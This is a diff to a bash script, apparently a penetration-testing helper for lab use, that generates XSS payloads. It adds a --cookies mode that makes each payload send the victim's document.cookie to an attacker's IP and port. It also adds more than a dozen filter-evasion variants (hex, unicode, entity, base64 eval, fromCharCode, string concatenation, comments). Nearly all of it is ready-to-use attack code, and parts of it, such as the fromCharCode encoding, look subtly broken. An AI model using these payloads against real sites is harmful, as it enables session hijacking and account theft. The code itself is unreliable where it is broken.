@@ -10,32 +10,57 @@ _payload_xss() {
     local tag="${1:-img}"
     local port="${2:-4444}"
     local ip="$(_payload_get_ip "$3")"
+    local cookies="${4:-false}"
     local path="xss_${tag}"
     
     case "$tag" in
         img)
-            echo "<img src=\"http://${ip}:${port}/${path}\">"
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=\"http://${ip}:${port}/${path}?c=\"+document.cookie>"
+            else
+                echo "<img src=\"http://${ip}:${port}/${path}\">"
+            fi
             ;;
         img-onerror)
-            echo "<img src=x onerror=\"fetch('http://${ip}:${port}/${path}')\">"
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror=\"fetch('http://${ip}:${port}/${path}?c='+document.cookie)\">"
+            else
+                echo "<img src=x onerror=\"fetch('http://${ip}:${port}/${path}')\">"
+            fi
             ;;
         script)
             echo "<script src=\"http://${ip}:${port}/${path}\"></script>"
             ;;
         script-fetch)
-            echo "<script>fetch('http://${ip}:${port}/${path}')</script>"
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script>fetch('http://${ip}:${port}/${path}?c='+document.cookie)</script>"
+            else
+                echo "<script>fetch('http://${ip}:${port}/${path}')</script>"
+            fi
             ;;
         svg)
-            echo "<svg onload=\"fetch('http://${ip}:${port}/${path}')\">"
+            if [[ "$cookies" == "true" ]]; then
+                echo "<svg onload=\"fetch('http://${ip}:${port}/${path}?c='+document.cookie)\">"
+            else
+                echo "<svg onload=\"fetch('http://${ip}:${port}/${path}')\">"
+            fi
             ;;
         iframe)
             echo "<iframe src=\"http://${ip}:${port}/${path}\"></iframe>"
             ;;
         body)
-            echo "<body onload=\"fetch('http://${ip}:${port}/${path}')\">"
+            if [[ "$cookies" == "true" ]]; then
+                echo "<body onload=\"fetch('http://${ip}:${port}/${path}?c='+document.cookie)\">"
+            else
+                echo "<body onload=\"fetch('http://${ip}:${port}/${path}')\">"
+            fi
             ;;
         input)
-            echo "<input onfocus=\"fetch('http://${ip}:${port}/${path}')\" autofocus>"
+            if [[ "$cookies" == "true" ]]; then
+                echo "<input onfocus=\"fetch('http://${ip}:${port}/${path}?c='+document.cookie)\" autofocus>"
+            else
+                echo "<input onfocus=\"fetch('http://${ip}:${port}/${path}')\" autofocus>"
+            fi
             ;;
         csp-script)
             echo "<script src=\"${ip}:${port}\"></script>"
@@ -53,10 +78,93 @@ _payload_xss() {
             echo "<iframe src=\"http://${ip}:${port}/${path}\"></iframe>"
             ;;
         csp-form)
-            echo "<form action=\"http://${ip}:${port}/${path}\" method=\"POST\"><input type=\"submit\" value=\"Click\"></form>"
+            if [[ "$cookies" == "true" ]]; then
+                echo "<form action=\"http://${ip}:${port}/${path}\" method=\"POST\"><input type=\"hidden\" name=\"cookie\" value=\"\"><script>document.forms[0].cookie.value=document.cookie;document.forms[0].submit()</script></form>"
+            else
+                echo "<form action=\"http://${ip}:${port}/${path}\" method=\"POST\"><input type=\"submit\" value=\"Click\"></form>"
+            fi
             ;;
         csp-object)
             echo "<object data=\"http://${ip}:${port}/${path}\"></object>"
+            ;;
+        bypass-hex)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror=\"\\x66\\x65\\x74\\x63\\x68('http://${ip}:${port}/${path}?c='+document.cookie)\">"
+            else
+                echo "<img src=x onerror=\"\\x66\\x65\\x74\\x63\\x68('http://${ip}:${port}/${path}')\">"
+            fi
+            ;;
+        bypass-unicode)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror=\"\\u0066\\u0065\\u0074\\u0063\\u0068('http://${ip}:${port}/${path}?c='+document.cookie)\">"
+            else
+                echo "<img src=x onerror=\"\\u0066\\u0065\\u0074\\u0063\\u0068('http://${ip}:${port}/${path}')\">"
+            fi
+            ;;
+        bypass-entity)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror=&#102;&#101;&#116;&#99;&#104;('http://${ip}:${port}/${path}?c='+document.cookie)>"
+            else
+                echo "<img src=x onerror=&#102;&#101;&#116;&#99;&#104;('http://${ip}:${port}/${path}')>"
+            fi
+            ;;
+        bypass-base64)
+            if [[ "$cookies" == "true" ]]; then
+                local b64=$(echo -n "fetch('http://${ip}:${port}/${path}?c='+document.cookie)" | base64)
+                echo "<img src=x onerror=\"eval(atob('$b64'))\">"
+            else
+                local b64=$(echo -n "fetch('http://${ip}:${port}/${path}')" | base64)
+                echo "<img src=x onerror=\"eval(atob('$b64'))\">"
+            fi
+            ;;
+        bypass-fromcharcode)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror=\"eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,${ip//./,},58,${port//./,},47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))\">"
+            else
+                echo "<img src=x onerror=\"eval(String.fromCharCode(102,101,116,99,104))\">"
+            fi
+            ;;
+        bypass-template)
+            if [[ "$cookies" == "true" ]]; then
+                printf '<img src=x onerror="fetch`http://%s:%s/%s?c=$''{document.cookie}`">\n' "${ip}" "${port}" "${path}"
+            else
+                printf '<img src=x onerror="fetch`http://%s:%s/%s`">\n' "${ip}" "${port}" "${path}"
+            fi
+            ;;
+        bypass-concat)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror=\"fet\\u0063h('ht'+'tp://${ip}:${port}/${path}?c='+document['coo'+'kie'])\">"
+            else
+                echo "<img src=x onerror=\"fet\\u0063h('ht'+'tp://${ip}:${port}/${path}')\">"
+            fi
+            ;;
+        bypass-comment)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror=\"/**/fetch/**/(/**/'http://${ip}:${port}/${path}?c='/**/+/**/document.cookie/**/)\">"
+            else
+                echo "<img src=x onerror=\"/**/fetch/**/(/**/'http://${ip}:${port}/${path}'/**/)\">"
+            fi
+            ;;
+        bypass-newline)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror=\"fetch(\n'http://${ip}:${port}/${path}?c='\n+\ndocument.cookie\n)\">"
+            else
+                echo "<img src=x onerror=\"fetch(\n'http://${ip}:${port}/${path}'\n)\">"
+            fi
+            ;;
+        bypass-double)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<img src=x onerror='fetch(\"http://${ip}:${port}/${path}?c=\"+document.cookie)'>"
+            else
+                echo "<img src=x onerror='fetch(\"http://${ip}:${port}/${path}\")'>"
+            fi
+            ;;
+        bypass-backtick)
+            if [[ "$cookies" == "true" ]]; then
+                printf '<img src=x onerror=`fetch('"'"'http://%s:%s/%s?c='"'"'+document.cookie)`>\n' "${ip}" "${port}" "${path}"
+            else
+                printf '<img src=x onerror=`fetch('"'"'http://%s:%s/%s'"'"')`>\n' "${ip}" "${port}" "${path}"
+            fi
             ;;
         *)
             echo "<img src=\"http://${ip}:${port}/${path}\">"
@@ -197,7 +305,7 @@ _payload_ssti() {
 }
 
 payloads() {
-    local type="" tag="" port="" ip="" file="" path="" listen=false all_tags=false
+    local type="" tag="" port="" ip="" file="" path="" listen=false all_tags=false cookies=false
     
     while [[ $# -gt 0 ]]; do
         case "$1" in
@@ -209,6 +317,7 @@ payloads() {
             --path) path="$2"; shift 2 ;;
             --listen|-l) listen=true; shift ;;
             --all|-a) all_tags=true; shift ;;
+            --cookies|-c) cookies=true; shift ;;
             --help|-h)
                 cat <<EOF
 Usage: payloads --type <TYPE> [OPTIONS]
@@ -222,8 +331,9 @@ Types:
   ssti         Server-side template injection
 
 XSS Options:
-  --tag        Tag type: img, img-onerror, script, script-fetch, svg, iframe, body, input, csp-script, csp-meta, csp-link, csp-base, csp-iframe, csp-form, csp-object
+  --tag        Tag type: img, img-onerror, script, script-fetch, svg, iframe, body, input, csp-script, csp-meta, csp-link, csp-base, csp-iframe, csp-form, csp-object, bypass-hex, bypass-unicode, bypass-entity, bypass-base64, bypass-fromcharcode, bypass-template, bypass-concat, bypass-comment, bypass-newline, bypass-double, bypass-backtick
   --all        Print all XSS tags at once
+  --cookies    Modify payloads to steal cookies (works with: img, img-onerror, script-fetch, svg, body, input, csp-form, bypass-*)
   --port       Port (default: 4444)
   --ip         IP address (default: htbip)
   --path       Path (default: xss_poc)
@@ -277,13 +387,13 @@ EOF
     case "$type" in
         xss)
             if [[ "$all_tags" == true ]]; then
-                local tags=("img" "img-onerror" "script" "script-fetch" "svg" "iframe" "body" "input" "csp-script" "csp-meta" "csp-link" "csp-base" "csp-iframe" "csp-form" "csp-object")
+                local tags=("img" "img-onerror" "script" "script-fetch" "svg" "iframe" "body" "input" "csp-script" "csp-meta" "csp-link" "csp-base" "csp-iframe" "csp-form" "csp-object" "bypass-hex" "bypass-unicode" "bypass-entity" "bypass-base64" "bypass-fromcharcode" "bypass-template" "bypass-concat" "bypass-comment" "bypass-newline" "bypass-double" "bypass-backtick")
                 for t in "${tags[@]}"; do
-                    echo "$(_payload_xss "$t" "$port" "$ip")"
+                    echo "$(_payload_xss "$t" "$port" "$ip" "$cookies")"
                 done
                 return 0
             else
-                payload=$(_payload_xss "$tag" "$port" "$ip" "$path")
+                payload=$(_payload_xss "$tag" "$port" "$ip" "$cookies")
             fi
             ;;
         sqli)
